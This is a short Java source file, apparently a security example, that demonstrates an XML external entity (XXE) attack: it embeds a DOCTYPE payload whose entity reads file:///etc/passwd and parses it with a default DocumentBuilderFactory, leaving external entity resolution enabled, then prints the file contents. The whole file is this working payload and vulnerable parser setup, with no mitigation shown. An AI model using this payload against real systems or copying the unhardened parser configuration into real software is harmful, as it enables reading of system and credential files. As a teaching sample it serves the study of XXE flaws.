package com.example.security;

import javax.xml.parsers.*;
import org.w3c.dom.*;
import java.io.*;
import org.xml.sax.SAXException;

public class XXEExample {
    public static void main(String[] args) throws Exception {
        String xmlData = "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>";
        DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
        DocumentBuilder builder = factory.newDocumentBuilder();
        Document doc = builder.parse(new ByteArrayInputStream(xmlData.getBytes()));
        System.out.println("Parsed XML: " + doc.getDocumentElement().getTextContent());
    }
}
